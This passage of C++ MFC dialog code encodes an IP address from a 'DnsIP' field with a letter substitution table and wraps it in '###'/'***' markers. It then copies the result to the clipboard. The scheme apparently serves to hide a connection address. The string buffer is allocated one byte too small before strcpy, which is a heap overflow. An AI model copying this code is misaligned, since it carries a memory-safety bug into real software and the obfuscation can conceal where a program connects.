	int arr[10][15]= {'s','t','u','v','w','x','y','z','a','b','c','d','e','f','g','t','u','v','w','x','y','z','a','b','c','d','e','f','g','h','u','v','w','x','y','z','a','b','c','d','e','f','g','h','i','v','w','x','y','z','a','b','c','d','e','f','g','h','i','j','w','x','y','z','a','b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','w','x','y','z','a','n','o','p','q','r','s','t','u','v','w','x','y','z','a','b','o','p','q','r','s','t','u','v','w','x','y','z','a','b','c','p','q','r','s','t','u','v','w','x','y','z','a','b','c','d','q','r','s','t','u','v','w','x','y','z','a','b','c','d','e'};
	int D[15]={'r','s','t','u','v','w','x','y','z','a','b','c','d','e','f'};
	char *ip=new char[strlen(m_EDIT_DnsIP)];
	strcpy(ip,m_EDIT_DnsIP);
	
	for (int x=0;x<strlen(ip);x++)
	{
		
		if (ip[x]=='.')
		{
			ip[x] = D[x];
		}
		else 
			ip[x] = arr[ip[x]-48][x];	
	}

	char B15[] = {'#','#','#','\0'};
    char B16[] = {'*','*','*','\0'};
	CString stIP=ip;
	stIP = B15+stIP+B16;
	if ((strlen(stIP)>21) || (strlen(stIP)<13))
	{
		SetDlgItemText(IDC_EDIT_DNSIPJIAMI,"IP数据不正确");
	}
	else
		SetDlgItemText(IDC_EDIT_DNSIPJIAMI,stIP); 
	
//	m_long_ipjm.EnableWindow(TRUE); 
}

void CUpdateDlg::OnDnsipsjfz() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
    CString strText1 = m_EDIT_DnsIPjiami;
	
	//将内容保存到剪贴板。
	if (!strText1.IsEmpty())
	{
		if (OpenClipboard())
		{
			EmptyClipboard();
			HGLOBAL hClipboardData = GlobalAlloc(GHND | GMEM_SHARE, (strText1.GetLength() + 1) * sizeof(TCHAR));
			if (hClipboardData)
			{
				TCHAR* pszData = (TCHAR *)GlobalLock(hClipboardData);
				strcpy(pszData, strText1);
				GlobalUnlock(hClipboardData);
				SetClipboardData(CF_TEXT, hClipboardData);
			}
			
			CloseClipboard();
			
		}
		MessageBox("复制成功!","提示...", MB_ICONINFORMATION);
		}	
}
